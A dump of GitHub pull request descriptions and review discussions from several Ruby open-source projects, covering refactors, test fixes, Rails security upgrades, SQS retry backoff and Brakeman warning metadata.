:warning: This PR should be merged into `release/4.2`","[""I've prepared a stage. <a href='http://fix-specify-watchers-link.opf-openproject-2af22bf12c7dfdad4ddf.ttrcloud.com' target='_blank'>Click to open.</a>"", '@ulferts I added users that are not allowed as watchers to the list of 422 reasons and clarified that either all or no users are added as watchers.\r\n\r\n**Open Question**: Should we add another error identifier for any of those cases? Providing a wrong resource type (status when user was expected) sounds like something we will have to deal with very often and thus might answer quite specifically... **edit: I said yes**', 'One point found during a third party review:\r\n\r\n* [x] Specification should state the response for trying to add/remove a non existant user', 'Rebase me!', ""@ulferts We decided (some time ago), that it would make sense from an API perspective to have the available watchers on the same level as the available assignees and available responsibles. That is: They should all reside under `projects/:id`.\r\n\r\nHowever I noted, that on the ruby side I can't ask a project for its available watchers. I can only do that for an `acts_as_watchable`.\r\n\r\nShould I:\r\n\r\na) Move the available watchers endpoint back to `work_packages/:id`\r\nb) Allow the project on the ruby side to know its possible watchers (effectively moving the method in the backend)\r\n\r\nWhat is your opinion here? From a code perspective I'd favour a), from an API perspective I'd favour b)."", '@NobodysNightmare as there are different things one can watch (WP, wiki, ...) and those require separate permissions, the list can not be on the project scope. It therefore has to be moved to the work package scope IMO.', 'Considering this done, even though I saw things I did not want to see...\r\nBut those have to wait for a later PR.\r\n\r\nWaiting for travis, if he is cool this is ready for review.\r\n\r\nedit: Travis is looking kind of good...', '@NobodysNightmare is the targeted branche (`dev`) still correct? We should probably reuse part of it in 4.2, right?', 'right', 'I will reopen this PR against the `release/4.2` branch']"
411,opf/openproject,3111.0,"This will address problems we found with the rspec capybara specs on our internal CI. 

Technically, this is considered housekeeping (https://community.openproject.org/work_packages/18714).","[""I've prepared a stage to preview changes. <a href='http://floriank-fix-failing-specs-inplace-edit.opf-openproject-2af22bf12c7dfdad4ddf.ttrcloud.com' target='_blank'>Open stage</a> or <a href='http://floriank-fix-failing-specs-inplace-edit.opf-openproject-2af22bf12c7dfdad4ddf.ttrcloud.com/teatro.log' target='_blank'>view logs</a>."", '@floriank can you please also apply the maximize to the other specs in `spec/features/work_packages/details/inplace_editor`. They should suffer from the same problem and if this is the case, those will fail if the execution order is wrong.', 'All specs concerning the inplace editor should have the shared context included']"
412,opf/openproject,3138.0,"Fixes all security issues reported today in:

http://weblog.rubyonrails.org/2015/6/16/Rails-3-2-22-4-1-11-and-4-2-2-have-been-released-and-more/

Please note:
* Although the report states that rails 3.2 is affected by CVE-2015-3226, it apparently is not as the spec passed without any adjustments in the productive code
* I had to update rails by hand as the custom sprockets prevents the usage of bundler
* rails 3.2.22 contains more than just the security fix (when compared to 3.2.21):

> Differently from the Rails 4 releases, Rails 3.2.22 includes all the commits from the 3-2-stable branch. This mean [Sic] that now Rails 3.2 supports Ruby 2.2.

* I pinned rack to 1.4.6. This rack version was not mentioned but I am very glad it exists.

Fixes:
* https://community.openproject.org/work_packages/20469","[""I've prepared a stage to preview changes. <a href='http://ulferts-fix-security-rails-3-2-22.opf-openproject-2af22bf12c7dfdad4ddf.ttrcloud.com' target='_blank'>Open stage</a> or <a href='http://ulferts-fix-security-rails-3-2-22.opf-openproject-2af22bf12c7dfdad4ddf.ttrcloud.com/teatro.log' target='_blank'>view logs</a>.""]"
413,opf/openproject,3144.0,"This will use the absolute URLs to a resource for rendering the anchors. It
prevents the interfering of the Angular router with the Url, leading to
faulty redirects.

It also removes the links when no request is present (in the case of mailers).

Should meet the requirements of https://community.openproject.org/work_packages/20138","[""I've prepared a stage to preview changes. <a href='http://floriank-fix-20138-toc-links-broken.opf-openproject-2af22bf12c7dfdad4ddf.ttrcloud.com' target='_blank'>Open stage</a> or <a href='http://floriank-fix-20138-toc-links-broken.opf-openproject-2af22bf12c7dfdad4ddf.ttrcloud.com/teatro.log' target='_blank'>view logs</a>."", ""Hm, travis doesn't like it...at all."", 'seems like a rebase issue..', ""> It also removes the links when no request is present (in the case of mailers).\r\n\r\nI am missing that in the code. Neither the tests nor the implementation seem to tell me why the hell the request might be missing.\r\n\r\nApparently there is a valid case for that and it should be obvious from the code or its comments (or specs).\r\n\r\nI still don't *understand* it though. Shouldn't it be possible to have a valid link even inside a mail?\r\n\r\nI'd either expect `https://example.com/full/path#anchor` to get me out of the mail and into the website **or** simply `#anchor`, because I expect a mail client to be able to handle anchor references inside my mail...\r\n\r\nedit: I verified it, my mail client can handle anchors... You received the same mail ^^"", ""I talked to @ulferts and decided that anchors are not working in emails*.\r\n\r\nI'll have it so that the full url is used when a request is present and a simple anchor is used for all other cases, e.g. emails which have been sent through a delayed job.\r\n\r\n*people using HTML emails are __wrong__"", ""> I'll have it so that the full url is used when a request is present and a simple anchor is used for all other cases\r\n\r\nFine by me, this means it will be working in emails ^^"", 'LGTM :+1: \r\n\r\nMerge as soon as travis agrees...', '@NobodysNightmare merge mich.', ""@floriank this solution doesn't work on Rails 4 btw.\r\n```\r\nActionController::UrlGenerationError:\r\n       No route matches {}\r\n```\r\n\r\n31b12a6ead4ef59f7b057aa86280fa64039dc8a9 and ~~9898552e0ff7da54cc6db1f154452211bf0e9130~~ 61d77c721bef8a78a7c52a699e4b00020ffc3673 (PR #2104) should make this PR work on Rails 4. Can you take a look?"", 'We probably need to find another solution, the `TextFormatting` was not really made for all the angular stuff we are doing.', '@floriank yep.. `TextFormatting` is a pretty crude extraction of code that was formerly in `ApplicationHelper` (d13eba74b9ab334f8567c45707efd5b54b468831). It needs proper refactoring.']"
414,opf/openproject,3194.0,":information_desk_person: **This PR doesn't deal with deprecation warnings that are not ActiveRecord related.** 

Supercedes #3186

https://community.openproject.org/work_packages/20325
https://community.openproject.org/work_packages/20701","[""I've prepared a stage to preview changes. <a href='http://myabc-feature-20325-rails4-deprecated-dynamic-finders.opf-openproject-2af22bf12c7dfdad4ddf.ttrcloud.com' target='_blank'>Open stage</a> or <a href='http://myabc-feature-20325-rails4-deprecated-dynamic-finders.opf-openproject-2af22bf12c7dfdad4ddf.ttrcloud.com/teatro.log' target='_blank'>view logs</a>."", '`Api::V2::UsersController` seems to be flickering:\r\n\r\n```\r\nbe rspec ./spec/controllers/api/v2/users_controller_spec.rb:45 --seed 61336\r\nbe rspec ./spec/controllers/api/v2/users_controller_spec.rb:45 --seed 56166\r\n```', '@opf/developers please begin reviewing. I realise the code reformatting complicates review somewhat (but necessary, so that I can keep re-running rubocop on changes).\r\n\r\n57618b2 and [e02eb01...feature/20325-rails4-deprecated-dynamic-finders](https://github.com/myabc/openproject/compare/e02eb01...feature/20325-rails4-deprecated-dynamic-finders) are the commit ranges of interest.', '`acts_as_searchable` still needs to be upgraded, but that probably needs _extra-careful review_. I may do it as a separate PR, once this is merged.', '@oliverguenther fyi, the code reformatting in this PR will probably lead to some conflicts with #3196.', ""@NobodysNightmare we could define our own `allow_non_nil` or `allow_unless_nil` method, but I'm not sure how common a use-case this really is."", 'Please review me :smile: ', 'Regarding the commits ""Fix syntax (w/Rubocop) in XXX"":\r\n\r\nI had a rough look over the first two of those commits and initially commented inline, but to make that more general:\r\n\r\n* Sometimes the recognition of ""return value based"" vs ""side effect based"" blocks fails\r\n* Some ""empty"" (or default-ish) else branches are being removed, though they seem to serve the purpose of readability\r\n* **tl; dr:** sometimes an automatic tool just fails to do the right thing\r\n\r\nI am not sure how we want to deal with this problem in general. Arguably these changes by you make the overall situation better, while introducing collateral damage. That is why I am inclined to merge those changes regardless.\r\nBut I don\'t feel like we will be able to keep ""100% `rubocop -a` compatibility"" in the long term. I don\'t know if this is a problem...', 'I did the same for your AR finder commits (looking at the first two and extrapolating).\r\n\r\nThe only thing that leaves me uncertain is if it is relevant in which order active record scopes are applied. My google capabilities were not good enough [to find that out](https://www.google.de/search?q=ar+scope+order&source=lnms&tbm=isch&sa=X&ei=Ju2bVbv8DMTgywOCsYDgCg&ved=0CAgQ_AUoAg&biw=1246&bih=944) ^^\r\n\r\nI will retry to find out more about this question, but you will probably already have an answer.', ""You should see my hint on calling `Project.allowed_to_condition`, `includes` and `references` as a more general advice. I've seen this pattern with other methods too, where the caller uses some kind of condition he really doesn't know, but for some reason starts to `include` and `reference` fancy tables. Sometimes acompanied with a comment that excuses for this.\r\n\r\nI think since the introduction of `references` only amplifies that (already existing) problem, we should at least start to look for a way out for the worst offenders."", 'Pew... reviewed until the latest commit:\r\n\r\n> Revert ""DRY WorkPackageSchema#available_custom_fields spec"" \xe2\x80\xa6 `0436446`\r\n\r\nLooking nice (and tedious) :)', '@NobodysNightmare \r\n\r\n> Pew... reviewed until the latest commit:\r\n\r\nThanks!\r\n\r\n> Looking nice (and tedious) :)\r\n\r\nYes, sure is tedious.\r\n\r\nI think I\'ve now dealt with all of your comments, with the exception of reordering `references` in query chains. As we already discussed, there may be some `references` that can be removed once we\'re on Rails 4.1.\r\n\r\n> tl; dr: sometimes an automatic tool just fails to do the right thing\r\n> I am not sure how we want to deal with this problem in general. Arguably these changes by you make the overall situation better, while introducing collateral damage. That is why I am inclined to merge those changes regardless.\r\n> But I don\'t feel like we will be able to keep ""100% rubocop -a compatibility"" in the long term. I don\'t know if this is a problem...\r\n\r\nI reported one of the issues upstream (https://github.com/bbatsov/rubocop/issues/2021). I tend to be optimistic though, and think `rubocop` can only get better at linting/auto-correcting code.  It\'s annoying though that Hound is still on a slightly older version of `rubocop` and that there are some discrepancies in configurations.', '@myabc I am done with my review and once I received statements to my comments, willing to merge this PR.\r\n\r\nThanks for the huge amount of work you have put in here!']"
415,opf/openproject,3308.0,"Introduces a `WorkPackageFieldConfigurationService` to hold the configuration information about the various work package fields.

I didn't yet dared to move other configuration information from the `WorkPackageFieldService` but there are candidates like `getInplaceEditStrategy` and `getInplaceDisplayStrategy` that do not belong into the data layer.

The `WorkPackageFieldConfigurationService` for now holds information about the explicit sorting (as opposed to whatever the server provides). It is for now only applied to the sorting of versions.

https://community.openproject.org/work_packages/20278","[""I've prepared a stage to preview changes. <a href='http://ulferts-fix-sort-version-by-name.opf-openproject-2af22bf12c7dfdad4ddf.ttrcloud.com' target='_blank'>Open stage</a> or <a href='http://ulferts-fix-sort-version-by-name.opf-openproject-2af22bf12c7dfdad4ddf.ttrcloud.com/teatro.log' target='_blank'>view logs</a>."", 'Except form the little test issue it LGTM :+1: ', '* [x] Inplace edit\r\n* [x] Filter\r\n* [x] Bulk edit\r\n* [x] Edit\r\n* [ ] [...]', 'I think I fixed all the places where versions are sorted.  ', 'LGTM :+1: \r\n\r\nBut lets wait for travis...', '@ulferts Karma looks like a legitimate failure...', 'I am disabling the failing test now. I tried to fix it but to no avail. It is working locally, making debugging extremely hard.', 'That is sad... :(']"
416,owncloud/android,627.0,,"["":+1: \r\n\r\nBut let's wait for a slight retest; cc @purigarcia @rperezb ."", ':+1:\r\nIt works fine']"
417,phlipper/chef-percona,65.0,"Forked from #64

Basically just want to make sure that chef runs go to completion for each recipe. Actual acceptance tests can come later.

Copying this approach:
https://github.com/patcon/vagrant-prototyping#readme","[""@patcon `test-kitchen` support would be amazing! It has been on my list of items to get to for a long time, but I haven't had the time yet. "", ""Awesome! How do you feel about things like this:\r\nhttps://github.com/opscode-cookbooks/apt#requirements\r\n\r\nWe'll need messy version-constraints if we're supporting 10.x rather than 11.x. `metadata.rb` doesn't offer a good way to have varying constraints based on `Chef::VERSION`. We could do something hacky in there, or otherwise we have to choose one or the other.\r\n\r\nThe good news is that the `apt` cookbook thing is minorly divergent right now, so not super-critical:\r\nhttps://github.com/opscode-cookbooks/apt/blob/master/CHANGELOG.md#v200"", ""Thanks Phil! I'm 100% down with that process.\r\n\r\nFYI, recently got tuned into the approach below, in case you're interested :)\r\nhttps://github.com/fgrehm/vagrant-cachier/issues/10"", 'Still working at getting this right, but should finish today, if you have time for review.\r\n\r\nNote for later: encrypted databag coverage is possible with test-kitchen if we feel like testing that flow:\r\nhttps://github.com/opscode/test-kitchen/blob/master/lib/kitchen/chef_data_uploader.rb#L49', ""If you're not using cluster support anymore, and no one else has complained that its broken, do you think we'd be safe to just deprecate this for now. We can always add it back later once things are more coherent, but it would make refactoring this on top of the mysql cookbook much simpler."", "":+1: for this work, by the way. It's really appreciated here!"", 'No prob man! My pleasure. And thanks :)', ""bump? can we merge this? the cluster deprecation notes are the most controversial, so please let me know. I'd love to merge something soon, and am totally fine to remove that if it's the only hold-out :)"", ""@patcon This is looking great! I'm OK with the cluster deprecation notes, though that recipe should probably be removed soon in another PR unless getting it fixed/running on test-kitchen is a relatively quick task. \r\n\r\nDo you need any keys for AWS or encryption or anything like that to get this running? I'm super excited to see this get merged!"", ""haha I think it should be good to go, as you gave me access to the repo, which gave me access to get my credentials into the travis run. I'll do a once over in the next hour or so, then merge in and make sure it's working :)\r\n\r\nThanks again! Sorry that I've been pinging you like crazy here"", ""As for removing `percona::cluster`, I'll just ignore it in the testing for now, so it's no skin off my back.\r\n\r\nI've just realized that this project will probably need a `TESTING.md` doc to explain how to using `local.kitchen.yml` for local vagrant testing (in case people don't want to use ec2). Also, it should mention that any minor commits or merges into master [should have `[ci skip]` in the commit message](http://about.travis-ci.org/docs/user/how-to-skip-a-build/), as it would help me save spinning up 8 EC2 instances for things like doc changes :)"", ""AWESOME. We got a first green light :)\r\n\r\nI couldn't get it working in vbox, but it should also be possible to run our tests on travis using `kitchen-lxc` rather than `kitchen-ec2`. This uses linux containers on travis itself, and it usually much quicker, plus won't require ec2 time. I'll start another issue for that, but I'm not in a rush to figure out LXC\r\n\r\nhttps://github.com/portertech/kitchen-lxc""]"
418,phstc/shoryuken,72.0,This implements the auto-retry with exponential backoff feature discussed in #65.,[]
419,phstc/shoryuken,73.0,Here's a new pull request.  I have renamed AutoRetry to ExponentialBackoffRetry.,"['This references #65 ', ""Hi @joekhoobyar \r\n\r\nGreat work!\r\n\r\nDid you have a chance to test it for real? `visibility_timeout` in the sdk is [change_visibility](http://docs.aws.amazon.com/sdkforruby/api/Aws/SQS/Client.html) and I couldn't find a new one for `receive_count`.\r\n\r\nThe maximum visibility timeout must be less than 43200 `12.hours`, i.e. 43199. And it's incremental, if the first time it was delayed for `1.hour`, the next delay should not exceed 11.hours otherwise it will raise an exception.  But I don't think we can do much with that, I believe people must be careful while configuring the `retry_intervals`.\r\n\r\n```ruby\r\nsqs_msg.change_visibility visibility_timeout: 43200\r\nAws::SQS::Errors::InvalidParameterValue: Value 43200 for parameter VisibilityTimeout is invalid. Reason: Total VisibilityTimeout for the message is beyond the limit [43200 seconds].\r\nfrom /Users/pablo/.gem/ruby/2.0.0/gems/aws-sdk-core-2.0.21/lib/seahorse/client/plugins/raise_response_errors.rb:15:in `call'\r\n```"", ""@phstc - wow, I didn't take the new SDK into consideration.  Let me make these changes.  Also, I see what you mean about the visibility timeout.  I think there is a timestamp for the first receipt date of a message.  We could use that, possibly."", ""Alright, I have been testing this at the console and it looks like the visibility timeout starts from the _most recent_ message receipt.  So, I guess we don't need the first receipt date after all."", '@phstc - This is finally ready!  I have tested it for real, and gotten everything working properly. :+1: ', ""An example of the visibility timeout working on messages first received an hour ago, but most recently received 60 seconds ago (or less):\r\n\r\n```ruby\r\n# Time.now is  2015-03-12 12:40:59 -0400\r\ntime1 = Time.at(msg1.attributes['ApproximateFirstReceiveTimestamp'].to_i / 1000)  \r\n# time1 is 2015-03-12 11:46:55 -0400\r\n\r\n# Message was LAST received around 60 seconds ago, so the following succeeds:\r\nmsg1.change_visibility(visibility_timeout: 43100)\r\n```"", ""@phstc - See my latest comment (with example code).  It looks like we don't need `ApproximateFirstReceiveTimestamp`"", ""@phstc - I've made that change to `= %[All]`.  Think this is ready to be merged in.  wdyt?"", 'Great work, thanks! Added to master :beers: ', 'Nice feature!  I thought we may have to build this ourselves, but here it is.  :+1: \r\n\r\nWould be nice to see some documentation about this in the README or wiki.  I had to discover this feature through this PR.', '> Nice feature!\r\n\r\nGreat work from @joekhoobyar :beers: \r\n\r\n> Would be nice to see some documentation about this in the README or wiki\r\n\r\n@steveklebanoff good idea. Just added an entry, could you review it? :smile: \r\n\r\nhttps://github.com/phstc/shoryuken/wiki/Worker-options#retry_intervals', 'Entry in the wiki looks good, thank you for updating! :+1: \r\n\r\nOnly other thought is that it would likely be good to reference this on the [Retrying a message](https://github.com/phstc/shoryuken/wiki/Retrying-a-message) page as well. Thanks for your hard work @joekhoobyar and @phstc ', '@steveklebanoff good idea again! :beers: \r\n\r\nDone https://github.com/phstc/shoryuken/wiki/Retrying-a-message#exponential-backoff']"
420,plataformatec/devise,2809.0,,"['@moisesweb great, everything looks good from here.\r\n\r\n@josevalim :shipit: ?', ""Hey @josevalim @lucasmazza I've updated this PR""]"
421,plataformatec/devise,2968.0,"Only execute the `SessionsController#destroy` if there is a logged in
user, otherwise it will raise `ActionController::InvalidAuthenticityToken`.

Fixes #2934.

cc @josevalim @lucasmazza ","['@josevalim updated. Thanks for your review :heart: ', ' :heart: :green_heart: :blue_heart: :yellow_heart: :purple_heart:', 'Is there an upcoming release planned soonish, or should I use master to get this? Thanks!']"
422,plataformatec/simple_form,1015.0,"With this change, Simple Form will execute the scope if it is present. Otherwise it will execute the conditions, exactly the same way as it did before this change.

This PR is an alternative implementation for #898.",[]
423,plexus/yaks,26.0,"As we progress a bit further here we are with a couple of more classes and
modules documented. This time we have documented the Format and FP classes.

Opinions as always appreciated.",[]
424,presidentbeef/brakeman,557.0,"This adds ```:file``` and ```:line``` keys in the warning hash for warnings relating to libraries (Gemfile/Gemfile.lock).

Some notes:
* In testing, I had to regenerate the ```:fingerprint``` as it was generated using a different ```relative_path``` and as such didn't match in the tests. (e.g. ```Gemfile``` vs ```Gemfile.lock```).

@presidentbeef, hopefully this addresses the changes we wanted relating to #544. :chicken: ","['*sigh*, tests were passing before I force pushed... looking into it now. Guess I got too excited :)', '@presidentbeef, I\'m getting some strange behavior from the testsuite. I\'ve spent some time debugging, but nothing is apparent so I thought I\'d check with you before I dig in deeper. Basically, deleteing ```:line => nil``` from ```test/tests/rails4.rb``` allows tests to pass, but setting ```:line``` to anything else causes the tests to fail.\r\n\r\nSo it appears to make sense if we make our changes (setting ```:file``` and ```:line``` in the warning hash), and do not change the ```rails4.rb``` test relating to ```test_sql_injection_CVE_2014_0080``` that it will fail:\r\n```\r\n[601/767] Rails4Tests#test_sql_injection_CVE_2014_0080 = 0.00 s\r\n  1) Failure:\r\ntest_sql_injection_CVE_2014_0080(Rails4Tests) [/Users/robfletcher/personal/pwnetrationguru/brakeman/test/tests/rails4.rb:492]:\r\nNo warning found.\r\n<0> expected to be != to\r\n<0>.\r\n```\r\n\r\nThis ```rails4.rb#test_sql_injection_CVE_2014_0080``` test looks like:\r\n```\r\n  def test_sql_injection_CVE_2014_0080\r\n    assert_warning :type => :warning,\r\n      :warning_code => 72,\r\n      :fingerprint => ""0ba20216bdda1cc067f9e4795bdb0d9224fd23c58317ecc09db67b6b38a2d0f0"",\r\n      :warning_type => ""SQL Injection"",\r\n      :line => nil,\r\n      :message => /^Rails\\ 4\\.0\\.0\\ contains\\ a\\ SQL\\ injection\\ vul/,\r\n      :confidence => 0,\r\n      :relative_path => ""Gemfile"",\r\n      :user_input => nil\r\n  end\r\n```\r\n\r\nThe above test is testing that ```:line => nil``` and since we are returning a line number (4 in this test) it fails. ```test/apps/rails4/Gemfile```:\r\n```\r\n  1 source \'https://rubygems.org\'\r\n  2\r\n  3 # Bundle edge Rails instead: gem \'rails\', github: \'rails/rails\'\r\n  4 gem \'rails\', \'4.0.0\'\r\n  5\r\n  6 gem \'pg\'\r\n```\r\n\r\nWe can verify ```4``` is the correct line number via the ```:version``` hash for the Rails 4 tests:\r\n```\r\n{:rails=>{:version=>""4.0.0"", :file=>""Gemfile"", :line=>4}, :sqlite3=>{:version=>nil, :file=>""Gemfile"", :line=>6}}\r\n```\r\n\r\nI would expect the following changes to ```test/tests/rails4.rb``` to pass, but they don\'t:\r\n```diff\r\ndiff --git a/test/tests/rails4.rb b/test/tests/rails4.rb\r\nindex 444a805..78e75ed 100644\r\n--- a/test/tests/rails4.rb\r\n+++ b/test/tests/rails4.rb\r\n@@ -493,7 +493,7 @@ class Rails4Tests < Test::Unit::TestCase\r\n       :warning_code => 72,\r\n       :fingerprint => ""0ba20216bdda1cc067f9e4795bdb0d9224fd23c58317ecc09db67b6b38a2d0f0"",\r\n       :warning_type => ""SQL Injection"",\r\n-      :line => nil,\r\n+      :line => 4,\r\n       :message => /^Rails\\ 4\\.0\\.0\\ contains\\ a\\ SQL\\ injection\\ vul/,\r\n       :confidence => 0,\r\n       :relative_path => ""Gemfile"",\r\n```\r\n\r\nThe above fails with:\r\n```\r\n[601/767] Rails4Tests#test_sql_injection_CVE_2014_0080 = 0.00 s\r\n  1) Failure:\r\ntest_sql_injection_CVE_2014_0080(Rails4Tests) [/Users/robfletcher/personal/pwnetrationguru/brakeman/test/tests/rails4.rb:492]:\r\nNo warning found.\r\n<0> expected to be != to\r\n<0>.\r\n```\r\n\r\nThis is where things get strange for me, even if I wildcard the ```:line``` assertion we get the failure. For example, change ```test/tests/rails4.rb``` to:\r\n```diff\r\ndiff --git a/test/tests/rails4.rb b/test/tests/rails4.rb\r\nindex 444a805..0c6901e 100644\r\n--- a/test/tests/rails4.rb\r\n+++ b/test/tests/rails4.rb\r\n@@ -493,7 +493,7 @@ class Rails4Tests < Test::Unit::TestCase\r\n       :warning_code => 72,\r\n       :fingerprint => ""0ba20216bdda1cc067f9e4795bdb0d9224fd23c58317ecc09db67b6b38a2d0f0"",\r\n       :warning_type => ""SQL Injection"",\r\n-      :line => nil,\r\n+      :line => /.*/,\r\n       :message => /^Rails\\ 4\\.0\\.0\\ contains\\ a\\ SQL\\ injection\\ vul/,\r\n       :confidence => 0,\r\n       :relative_path => ""Gemfile"",\r\n```\r\n\r\nSill fails with:\r\n```\r\n[601/767] Rails4Tests#test_sql_injection_CVE_2014_0080 = 0.00 s\r\n  1) Failure:\r\ntest_sql_injection_CVE_2014_0080(Rails4Tests) [/Users/robfletcher/personal/pwnetrationguru/brakeman/test/tests/rails4.rb:492]:\r\nNo warning found.\r\n<0> expected to be != to\r\n<0>.\r\n```\r\n\r\nI\'ve verified and reproduced several times, so hopefully I\'m not newbin\' it up someplace but do you have any thoughts? I can always just delete the ```:line => nil``` line completely from the test, but that feels a bit dirty.', 'Hi Rob,\r\n\r\nThe best way to diagnose these problems is to look at the warning output itself. You can run Brakeman on the app however you want, but the best way is probably to go to the `test` directory and run `ruby to_test.rb apps/rails4 -t SQLCVEs`. This generates the test code, but more importantly it shows what Brakeman would expect the warnings to look like.\r\n\r\nIn this case, the warning isn\'t about the Rails version, it\'s about the version of the ""pg"" gem. This is on line 6 of the Gemfile.\r\n\r\nI notice the other warnings in the SQLCVEs check aren\'t updated, though. Want to add that to your changes?\r\n\r\nAlso, `:line => /.*/` doesn\'t make sense because line isn\'t a string.', ""Nice! I was looking for a way to run the specific tests, so thanks for the command, that'll make things a little faster.\r\n\r\nYou were right, it was line 6 relating to ```:pg```, so I changed the test and its working like a charm.\r\n\r\nI'll update the other warnings in SQLCVEs.\r\n\r\nThanks so much for the patience and tips."", '@presidentbeef, ok, added and all tests passing. But there are some errors relating to ```jruby18-mode``` and ```jruby19-mode```:\r\n```\r\nRuntimeError: more then one gemspec found. please specify a specfile\r\nAn error occurred while installing brakeman (2.6.2), and Bundler cannot\r\n```', ""Cool, thanks. \r\n\r\nDon't worry about those failures, they are JRuby bugs."", 'Hi Rob,\r\n\r\nThanks for your work on this. Unfortunately, it introduces a pretty big change in the warnings. It will have to wait until the 2.7 or 3.0 release to be merged :panda_face: ', ""Hey @presidentbeef, ok, sounds good. If there is anything other work I can do relating to the gem_processor or this change. I'd be happy to.\r\n\r\nI'm also going to start digging through filed issues to see if there is something else I can start working on, unless you have something in mind? :smile: "", '#548 might be a good one to check out.', ""Oops, I didn't mean to close. This happens more frequently than it should for me and github :/""]"
425,presidentbeef/brakeman,239.0,"Added checks for latest CVEs. Checks for workarounds for [CVE-2013-0156](https://groups.google.com/d/topic/rubyonrails-security/61bkgvnSGTQ/discussion) like disabling XML parsing or disabling symbol/yaml types.

Also checks for YAML parsing being turned on in Rails 2.x.

Basic version check for [CVE-2013-0155](https://groups.google.com/d/topic/rubyonrails-security/c7jT-EeN9eI/discussion).",[]
426,projectblacklight/blacklight,830.0,,"['\n[![Coverage Status](https://coveralls.io/builds/588810/badge)](https://coveralls.io/builds/588810)\n\nCoverage remained the same when pulling **c41dc002eab2dd450e1080a69263098f6d65691f on fixup_jetty_generator** into **8191c4e8c915a134dd8f895c3c78b4b501b837b4 on master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/589884/badge)](https://coveralls.io/builds/589884)\n\nCoverage remained the same when pulling **b95202f0bb2f691d720ac6a022c814ccc95fa7c6 on fixup_jetty_generator** into **d6a8675ad5874b69601654ab9ac6a021219b05ae on master**.\n']"
427,projectblacklight/blacklight,1034.0,"Extract `Blacklight::SolrRepository` out of `Blacklight::SolrHelper` for handling interaction with Solr. Also, extract the query building parts of `SolrHelper` into `Blacklight::RequestBuilders` so all the solr parameter generation happens in the same place. ","[""I really like this change, but by this logic (https://github.com/projectblacklight/blacklight/pull/1032#issuecomment-64486259) it's a breaking change. For example if you've overridden SolrHelper#find, now the behavior of SolrHelper#query_solr has changed, it no longer calls your overridden SolrHelper#find method."", ""I'm not sure I buy that changing the parameters a method accepts and internal refactoring are equivalent.\r\n\r\nI'm happy to bump this to 6.x if you think it's a big deal."", ""I guess we're treading in a gray area.  I actually doubt this will affect anyone.""]"
428,projectblacklight/blacklight,1201.0,"This returns a cache_key method for classes that mixin `Blacklight::Document` that uses the class name, item id, and a formatted updated at timestamp.",['\n[![Coverage Status](https://coveralls.io/builds/2558632/badge)](https://coveralls.io/builds/2558632)\n\nCoverage increased (+0.04%) to 90.81% when pulling **a2fc28a513c44da0dc289214816ca381961df812 on cache-key** into **84770f7955ae692923758ffa68e9420bf659ae4e on master**.\n']
429,projectblacklight/blacklight,1203.0,"Facet pagination is still coupled to Solr, which will be problematic for installations of Blacklight using a different data source.

This commit takes the first step towards decoupling by making the facet paginator class configurable, and moves facet pagination query assembly into Solr's search builder.","[':+1: ', ""@rwd oh, and definitely feel free to ignore hound on code you haven't authored or modified in any substantial way. "", ""@cbeer, yep, I figured that was fair enough where I've just copied and pasted while refactoring."", '\n[![Coverage Status](https://coveralls.io/builds/2651517/badge)](https://coveralls.io/builds/2651517)\n\nCoverage increased (+0.01%) to 90.82% when pulling **dd32edbb0d9379930a32c8aaf607ce63c89ac521 on rwd:configurable_facet_paginator** into **b05cba165b39c0d0799e03d3fe1d30f76e263694 on projectblacklight:master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/2651931/badge)](https://coveralls.io/builds/2651931)\n\nCoverage increased (+0.03%) to 90.83% when pulling **5148db98b482156762311ec41db8294a0932874f on rwd:configurable_facet_paginator** into **b05cba165b39c0d0799e03d3fe1d30f76e263694 on projectblacklight:master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/2658918/badge)](https://coveralls.io/builds/2658918)\n\nCoverage increased (+0.11%) to 90.91% when pulling **83d214d1ed4513b38603769c332c228d232d769f on rwd:configurable_facet_paginator** into **b05cba165b39c0d0799e03d3fe1d30f76e263694 on projectblacklight:master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/2658918/badge)](https://coveralls.io/builds/2658918)\n\nCoverage increased (+0.02%) to 90.83% when pulling **83d214d1ed4513b38603769c332c228d232d769f on rwd:configurable_facet_paginator** into **b05cba165b39c0d0799e03d3fe1d30f76e263694 on projectblacklight:master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/2669555/badge)](https://coveralls.io/builds/2669555)\n\nCoverage increased (+0.03%) to 90.83% when pulling **d782a6b2598fee1fb0f07bd69fec9b60b8a472a3 on rwd:configurable_facet_paginator** into **b05cba165b39c0d0799e03d3fe1d30f76e263694 on projectblacklight:master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/2669723/badge)](https://coveralls.io/builds/2669723)\n\nCoverage increased (+0.03%) to 90.83% when pulling **542f0035bcf4f34e99af091355a8f4ee65e1688c on rwd:configurable_facet_paginator** into **b05cba165b39c0d0799e03d3fe1d30f76e263694 on projectblacklight:master**.\n', '@cbeer, @jcoyne: are you happy to merge this now?']"
430,projecthydra/sufia,372.0,,"[""It doesn't appear that travis picked up on this change.  Can you amend the commit and and then force-push to this branch?  Hopefully Travis will pick it up then?"", '@jcoyne Done', 'This looks good to me. :+1: ']"
431,projecthydra/sufia,408.0,,[':+1: ']
432,projecthydra/sufia,461.0,"...d code.  Pulling in linked_field override from scholarsphere to help

This PR removes the hard coded labels that were added into each view in addition to allowing changes for a set of fields in a single location.  Aka if we want to change the schema we do not need to change it everywhere, just in the few places that still reference it.","['The `render_linked_field` helper seems quite indirect. Can\'t we just pass it as a lamba?\r\n```ruby\r\nrender ""generic_files/show_fields/linked_field"", local_assigns.merge(generic_file: @generic_file, link_function: lambda { |obj| link_to_facet(obj, Solrizer.solr_name(""desc_metadata__based_near"", :facetable))}\r\n```\r\n', '@jcoyne: refactored the refactor to just use a lambda.  Defaulted to Thing for microdata type unless it was specified.', ""I'm still not sure if this is a refactor -- it looks like it breaks the microdata.  For instance, based_near used to have an itemprop of contentLocation.  Where is that in the refactor?  (And this is just one of a number of examples.)"", '@mjgiarlo: your microdata ""fix"" hard coded labels ect.  I\'m just trying to fix that.  Please point out all the micro data changes I broke and I will make an effort to fix them up.  Otherwise you can go and change your hard coded labels back to the blacklight label functions ect.  All in all I do not think hard coding is the direction we ""Should"" be going in, but if you are telling me that is the only way I\'ll close this PR.', '@cam156  Is hard-coding the metadata going to *break* something, or is it just generally inconsistent with our practice of stomping hard-coding where we see it?  If the former, I think we should wrack our brains to come up with a better solution.  If the latter, we might just need to hold our noses in the interest of delivering this feature in the meantime.', '@mjgiarlo  There are 